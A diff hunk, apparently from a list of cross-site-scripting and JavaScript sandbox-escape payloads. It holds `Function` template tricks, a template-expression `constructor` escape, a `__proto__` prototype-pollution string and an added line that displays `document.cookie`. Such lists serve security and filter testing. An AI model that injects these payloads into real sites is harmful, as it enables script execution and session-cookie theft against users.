@@ -229,3 +229,4 @@ Function`alert(1)```````````
 {{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}
 Function`$${`a${`l${`e${`r${`t${`(${`1${`)`}`}`}`}`}`}`}`}$```
 JSON.parse('{"__proto__":["a",1]}')
+alert.call(this, document.cookie)
